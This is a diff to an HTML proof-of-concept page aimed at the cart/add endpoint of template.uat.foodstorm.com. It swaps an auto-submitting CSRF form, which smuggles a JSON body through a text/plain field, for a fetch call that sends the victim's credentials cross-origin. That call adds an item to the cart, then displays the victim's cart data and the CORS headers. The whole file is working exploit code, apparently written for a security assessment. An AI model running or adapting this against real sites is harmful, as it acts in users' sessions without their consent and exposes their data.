@@ -1,9 +1,45 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>CORS CSRF PoC - template.uat.foodstorm.com/cart/add</title>
+</head>
 <body>
-  <form id="csrf" action="https://template.uat.foodstorm.com/cart/add" method="POST" enctype="text/plain">
-    <input name='{"Item":"Test Vanilla Ice Cream","Quantity":7,"WeightRequiresConfirmation":false,"Pack":null,"PackSelection":"","options":null,"HasItemOptions":false,"Recommendation":{},"x":"' value='"}'>
-  </form>
-  <script>document.getElementById("csrf").submit();</script>
+  <h2>CORS Misconfiguration PoC</h2>
+  <p>Sending cross-origin request with victim credentials...</p>
+  <pre id="output">Waiting for response...</pre>
+
+  <script>
+    fetch("https://template.uat.foodstorm.com/cart/add", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        "Item": "Test Vanilla Ice Cream",
+        "Quantity": 7,
+        "WeightRequiresConfirmation": false,
+        "Pack": null,
+        "PackSelection": "",
+        "options": null,
+        "HasItemOptions": false,
+        "Recommendation": {}
+      })
+    })
+    .then(r => {
+      document.getElementById("output").innerText +=
+        "\n\nAccess-Control-Allow-Origin: " + r.headers.get("access-control-allow-origin") +
+        "\nAccess-Control-Allow-Credentials: " + r.headers.get("access-control-allow-credentials");
+      return r.json();
+    })
+    .then(data => {
+      document.getElementById("output").innerText =
+        "SUCCESS - Victim cart data read cross-origin:\n\n" +
+        JSON.stringify(data, null, 2);
+    })
+    .catch(err => {
+      document.getElementById("output").innerText = "Error: " + err;
+    });
+  </script>
 </body>
 </html>
